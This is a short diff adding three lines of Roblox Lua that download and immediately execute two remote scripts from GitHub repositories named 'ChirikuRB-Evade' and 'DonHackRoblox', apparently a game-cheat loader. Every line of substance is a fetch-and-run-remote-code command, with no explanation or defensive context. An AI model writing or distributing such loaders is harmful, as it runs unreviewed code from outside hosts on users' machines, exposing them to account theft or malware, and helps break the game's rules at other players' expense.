@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Chiriku2013/ChirikuRB-Evade/refs/heads/main/ChirikuRB-Evade.lua"))()
+wait()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Chiriku2013/DonHackRoblox/refs/heads/main/DonHackRoblox.lua"))()
